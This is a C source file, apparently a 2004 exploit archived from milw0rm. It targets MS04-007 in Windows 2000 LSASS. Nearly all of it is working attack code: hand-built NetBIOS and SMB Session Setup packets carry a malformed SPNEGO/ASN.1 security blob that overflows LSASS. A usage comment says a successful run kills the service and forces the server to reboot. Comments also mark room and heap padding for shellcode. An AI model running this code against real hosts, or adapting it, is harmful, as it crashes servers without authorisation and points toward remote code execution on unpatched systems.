/*
 *  MS04-007 Exploit LSASS.EXE Win2k Pro Remote Denial-of-Service
 *
 *  Copyright (C) 2004  Christophe Devine
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

 /*
  *   > MS04-007-dos.exe 10.0.0.1 445
  *   connect failed
  *
  *   > nbtstat -A 10.0.0.1
  *   [..]
  *       SERVER3        <20>  UNIQUE      Registered
  *   [..]
  *   > MS04-007-dos.exe 10.0.0.1 139 SERVER3
  *   > MS04-007-dos.exe 10.0.0.1 139 SERVER3
  *   >
  *
  *   if the exploit works, LSASS gets killed,
  *   and after 1mn the server reboots.
  *  
  */

//#define WIN32

#ifdef WIN32

#include <winsock2.h>
#include <windows.h>

#else

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#endif

#include <stdio.h>

/****************************************************************/

unsigned char netbios_sess_req[] =

/* NetBIOS Session Request */

"\x81\x00\x00\x44"

"\x20\x45\x45\x45\x46\x45\x47\x45\x42\x46\x46\x45\x4D\x46\x45\x43"
"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
"\x41\x00"

"\x20\x45\x45\x45\x46\x45\x47\x45\x42\x46\x46\x45\x4D\x46\x45\x43"
"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x41"
"\x41\x00";

/****************************************************************/

unsigned char negotiate_req[] =

/* NetBIOS Message Type + Length & SMB Header */

"\x00\x00\x00\xB3"

"\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x08\x01\xC8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x75\x03\x00\x00\x02\x00"

/* Negotiate Protocol Request, actually sniffed from smbclient */

"\x00\x90\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F\x52\x4B\x20\x50"
"\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02\x4D\x49\x43\x52"
"\x4F\x53\x4F\x46\x54\x20\x4E\x45\x54\x57\x4F\x52\x4B\x53\x20\x31"
"\x2E\x30\x33\x00\x02\x4D\x49\x43\x52\x4F\x53\x4F\x46\x54\x20\x4E"
"\x45\x54\x57\x4F\x52\x4B\x53\x20\x33\x2E\x30\x00\x02\x4C\x41\x4E"
"\x4D\x41\x4E\x31\x2E\x30\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30"
"\x32\x00\x02\x44\x4F\x53\x20\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31"
"\x00\x02\x53\x61\x6D\x62\x61\x00\x02\x4E\x54\x20\x4C\x41\x4E\x4D"
"\x41\x4E\x20\x31\x2E\x30\x00\x02\x4E\x54\x20\x4C\x4D\x20\x30\x2E"
"\x31\x32\x00";

/****************************************************************/

unsigned char setup_request[] =

/* NetBIOS Message Type + Length & SMB Header */

"\x00\x00\xCC\xCC"

"\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x08\x01\xC8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x75\x03\x00\x00\x03\x00"

/* Session Setup AndX Request */

"\x0C\xFF\x00\x00\x00\xFF\xFF\x02\x00\x01\x00\x00\x00\x00\x00\xCC"
"\xCC\x00\x00\x00\x00\x5C\x00\x00\x80\xCC\xCC";

/* Security Blob: SPNEGO OID + ASN.1 stuff */

unsigned char security_blob[] =

/* Application Constructed Object + SPNEGO OID */

"\x60\x82\xCC\xCC\x06\x06\x2B\x06\x01\x05\x05\x02"

/* negTokenInit + Constructed Sequence */

"\xA0\x82\xCC\xCC\x30\x82\xCC\xCC"

/* mechType: NTLMSSP OID */

"\xA0\x0E\x30\x0C\x06\x0A\x2B\x06\x01\x04\x01\x82\x37\x02\x02\x0A"

/* reqFlags that should trigger the overflow */

"\xA1\x05\x23\x03\x03\x01\x07"

/* mechToken: NTLMSSP (room for shellcode here) */

"\xA2\x82\xCC\xCC\x04\x82\xCC\xCC"

"\x4E\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x15\x02\x08\x60"
"\x09\x00\x09\x00\x20\x00\x00\x00\x07\x00\x07\x00\x29\x00\x00\x00"
"\x57\x4F\x52\x4B\x47\x52\x4F\x55\x50\x44\x45\x46\x41\x55\x4C\x54";

/* Native OS & LAN Manager */

unsigned char other_stuff[] =

"\x00\x55\x00\x6E\x00\x69\x00\x78\x00\x00\x00\x53\x00\x61\x00\x6D"
"\x00\x62\x00\x61\x00\x00\x00";

/****************************************************************/

int main( int argc, char *argv[] )
{
    unsigned char buf[4096];
    struct hostent *server_host;
    struct sockaddr_in server_addr;
    int i, len, server_fd, n1, n2, n3;

#ifdef WIN32

    WSADATA wsa;

    /* initialize windows sockets */

    if( WSAStartup( MAKEWORD(2,0), &wsa ) )
    {
        fprintf( stderr, "WSAStartup failed\n" );
        return( 1 );
    }

#endif

    if( argc != 3 && argc != 4 )
    {
        fprintf( stderr, "usage: %s <target hostname> "
                         "<port> [netbios name]\n",
                 argv[0] );

        return( 1 );
    }

    /* resolve the server hostname and connect */

    server_host = gethostbyname( argv[1] );

    if( server_host == NULL )
    {
        fprintf( stderr, "gethostbyname(%s) failed\n", argv[1] );
        return( 1 );
    }

    memcpy( (void *) &server_addr.sin_addr,
            (void *) server_host->h_addr,
            server_host->h_length );

    sscanf( argv[2], "%d", &i );

    server_addr.sin_family = AF_INET;
    server_addr.sin_port   = htons( (unsigned short) i );

    server_fd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

    if( server_fd < 0 )
    {
        fprintf( stderr, "could not create socket\n" );
        return( 1 );
    }

    len = sizeof( server_addr );

    if( connect( server_fd, (struct sockaddr *)
                 &server_addr, len ) < 0 )
    {
        fprintf( stderr, "connect failed\n" );
        return( 1 );
    }

    if( argc == 4 )
    {
        /* encode the Called NetBIOS Name */

        len = sizeof( netbios_sess_req ) - 1;
        memcpy( buf, netbios_sess_req, len );
        memset( buf + 5, 'A', 32 );

        for( i = 0; i < (int) strlen( argv[3] ); i++ )
        {
            buf[5 + i * 2] += argv[3][i] >> 4;
            buf[6 + i * 2] += argv[3][i] & 15;
        }

        for( ; i < 16; i++ )
        {
            buf[5 + i * 2] += 0x20 >> 4;
            buf[6 + i * 2] += 0x20 & 15;
        }

        /* 1. NetBIOS Session Request */

        if( send( server_fd, buf, len, 0 ) != len )
        {
            fprintf( stderr, "send(NetBIOS Session Request) failed\n" );
            return( 1 );
        }

        if( recv( server_fd, buf, sizeof( buf ), 0 ) <= 0 )
        {
            fprintf( stderr, "recv(NetBIOS Session Response) failed\n" );
            return( 1 );
        }

        if( buf[0] == 0x83 )
        {
            fprintf( stderr, "NetBIOS Session rejected "
                             "(wrong NetBIOS name ?)\n" );
            return( 1 );
        }
    }

    /* 2. Negotiate Protocol Request */

    len = sizeof( negotiate_req ) - 1;

    if( send( server_fd, negotiate_req, len, 0 ) != len )
    {
        fprintf( stderr, "send(Negotiate Protocol Request) failed\n" );
        return( 1 );
    }

    if( recv( server_fd, buf, sizeof( buf ), 0 ) <= 0 )
    {
        fprintf( stderr, "recv(Negotiate Protocol Response) failed\n" );
        return( 1 );
    }

    /* 3. Session Setup AndX Request */

    memset( buf, 'A', sizeof( buf ) );

    n1 = sizeof( setup_request ) - 1;
    n2 = sizeof( security_blob ) - 1;
    n3 = sizeof( other_stuff   ) - 1;

    memcpy( buf,           setup_request, n1 );
    memcpy( buf + n1,      security_blob, n2 );

    n2 += 2000; /* heap padding for shellcode */

    memcpy( buf + n1 + n2, other_stuff,   n3 );

    len = n1 + n2 + n3;

    buf[ 2] = ( ( len - 4 ) >> 8 ) & 0xFF;      /* NetBIOS msg length   */
    buf[ 3] = ( ( len - 4 )      ) & 0xFF;

    buf[51] = ( n2      ) & 0xFF;               /* Security Blob Length */
    buf[52] = ( n2 >> 8 ) & 0xFF;

    buf[61] = ( ( n2 + n3 )      ) & 0xFF;      /* Byte Count (BCC)     */
    buf[62] = ( ( n2 + n3 ) >> 8 ) & 0xFF;

    buf[n1 +  2] = ( ( n2 -  4 ) >> 8 ) & 0xFF; /* ACO Length           */
    buf[n1 +  3] = ( ( n2 -  4 )      ) & 0xFF;

    buf[n1 + 14] = ( ( n2 - 16 ) >> 8 ) & 0xFF; /* negTokenInit Length  */
    buf[n1 + 15] = ( ( n2 - 16 )      ) & 0xFF;

    buf[n1 + 18] = ( ( n2 - 20 ) >> 8 ) & 0xFF; /* Constr. Seq. Length  */
    buf[n1 + 19] = ( ( n2 - 20 )      ) & 0xFF;

    buf[n1 + 45] = ( ( n2 - 47 ) >> 8 ) & 0xFF; /* mechToken Length     */
    buf[n1 + 46] = ( ( n2 - 47 )      ) & 0xFF;

    buf[n1 + 49] = ( ( n2 - 51 ) >> 8 ) & 0xFF; /* String Length        */
    buf[n1 + 50] = ( ( n2 - 51 )      ) & 0xFF;

    if( send( server_fd, buf, len, 0 ) != len )
    {
        fprintf( stderr, "send(Session Setup AndX Request) failed\n" );
        return( 1 );
    }

    recv( server_fd, buf, sizeof( buf ), 0 );

    shutdown( server_fd, 2 );

    return( 0 );
}



// milw0rm.com [2004-02-14]
